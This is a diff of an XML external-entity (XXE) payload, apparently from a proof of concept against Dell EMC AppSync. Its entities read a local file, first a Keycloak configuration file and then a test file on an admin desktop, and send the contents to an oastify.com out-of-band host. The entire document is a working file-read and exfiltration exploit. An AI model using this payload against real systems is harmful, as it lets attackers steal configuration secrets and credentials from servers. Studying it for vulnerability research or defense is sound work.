@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///C:/EMC/AppSync/keycloak/conf/keycloak.conf">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://o9y4qocq5btvi6javjly0d9j8ae12rqg.oastify.com/xxe-file-read?x=%file;'>">
+<!ENTITY % file SYSTEM "file:///C:/Users/ADMIN/Desktop/poc.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://do5t5drfk08kxvyza80nf2o8nztqhl5a.oastify.com/xxe-file-read?x=%file;'>">
 %eval;
 %exfil;
